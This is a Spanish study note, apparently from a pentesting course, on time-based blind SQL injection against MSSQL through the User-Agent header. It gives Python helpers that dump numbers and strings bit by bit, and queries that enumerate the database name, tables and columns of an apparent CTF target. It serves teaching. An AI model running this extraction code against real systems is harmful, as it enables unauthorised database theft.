---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Enumeracion
Descripción: "A diferencia del caso boolean (donde adivinamos la tabla users y la columna password), aquí no sabemos nada de la consulta salvo que usa el User-Agent"
Fecha de actualización: 2026-06-04
Nota previa: "[[07 - Diseño del oráculo temporal]]"
Nota siguiente: "[[09 - Exfiltración Out-of-Band por DNS]]"
Area: "[[SQLi Blind.base|SQLi Blind]]"
---
---

A diferencia del caso boolean (donde adivinamos la tabla `users` y la columna `password`), aquí no sabemos nada de la consulta salvo que usa el `User-Agent`. <mark style="background: #ADCCFFA6;">Hay que enumerar a ciegas la estructura completa —base, tablas, columnas— antes de saber qué volcar</mark>. La clave es construir dos helpers reutilizables sobre el [[07 - Diseño del oráculo temporal|oráculo]].

# Helpers: volcar números y cadenas

Encapsular la extracción [[05 - Optimización de la extracción|bit a bit]] en dos funciones genéricas hace el resto trivial:

```python
# Vuelca un número (0-255) bit a bit; usa range(16) si un count/longitud pudiera superar 255
def dumpNumber(q):
    n = 0
    for p in range(8):
        if oracle(f"({q})&{2**p}>0"):
            n |= 2**p
    return n

# Vuelca una cadena: primero su longitud, luego cada carácter
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val
```

> [!important]+
> Con time-based, los [[05 - Optimización de la extracción|algoritmos optimizados]] no son un lujo: <mark style="background: #FFB86CA6;">7 peticiones bit a bit por carácter pueden tardar 7 segundos; el bucle lineal de 95 valores tardaría más de 100 segundos por carácter</mark> —minutos por dato—. SQL-Anding/bisección son obligatorios aquí.

# Enumerar el nombre de la base

```python
db_len  = dumpNumber("LEN(DB_NAME())")
db_name = dumpString("DB_NAME()", db_len)      # -> 'digcraft'
```

# Enumerar tablas (con el matiz de MSSQL)

Primero el número de tablas, luego cada nombre. <mark style="background: #8000E1A6;">MSSQL no tiene `LIMIT`/`OFFSET` como MySQL</mark>: para recorrer resultados de uno en uno se usa la sintaxis estándar `ORDER BY ... OFFSET n ROWS FETCH NEXT 1 ROWS ONLY`:

```python
num_tables = dumpNumber("SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft'")

for i in range(num_tables):
    base = (f"SELECT {{}} FROM information_schema.tables "
            f"WHERE table_catalog='digcraft' ORDER BY table_name "
            f"OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    tlen  = dumpNumber(base.format("LEN(table_name)"))
    tname = dumpString(base.format("table_name"), tlen)
    print(tname)        # -> 'flag', 'userAgents'
```

# Enumerar columnas

Idéntico patrón sobre `information_schema.columns`, filtrando por la tabla de interés (`flag`):

```python
num_cols = dumpNumber("SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns WHERE table_name='flag' AND table_catalog='digcraft'")

for i in range(num_cols):
    base = (f"SELECT {{}} FROM INFORMATION_SCHEMA.columns "
            f"WHERE table_name='flag' AND table_catalog='digcraft' ORDER BY column_name "
            f"OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    clen  = dumpNumber(base.format("LEN(column_name)"))
    cname = dumpString(base.format("column_name"), clen)
    print(cname)        # -> 'flag'
```

# El flujo completo

<mark style="background: #FFB8EBA6;">La enumeración ciega replica la [[06 - Enumeración de la base de datos|enumeración non-blind]], pero cada dato cuesta peticiones y tiempo</mark>:

1. `DB_NAME()` → la base actual.
2. `INFORMATION_SCHEMA.TABLES` → tablas de esa base.
3. `INFORMATION_SCHEMA.COLUMNS` → columnas de la tabla jugosa.
4. `SELECT <columna> ... OFFSET <fila>` → los datos, fila a fila.

> [!warning]+
> Volcar una tabla entera a ciegas por tiempo puede llevar **horas** y genera un volumen de peticiones enorme. <mark style="background: #FF5582A6;">En un objetivo real, extrae solo el dato que demuestra el impacto</mark> (una credencial, el flag), no la base completa. Y vigila el rate limiting: a este ritmo, un bloqueo a mitad obliga a empezar de nuevo. Por eso, en la práctica, esta automatización a medida convive con [[SQLMap.base|SQLMap]] (`--technique=T`), que gestiona reintentos y sesión.

Cuando ni el contenido ni el tiempo son canales viables (latencia extrema, WAF que corta conexiones largas), queda exfiltrar los datos por un canal externo: [[09 - Exfiltración Out-of-Band por DNS]].
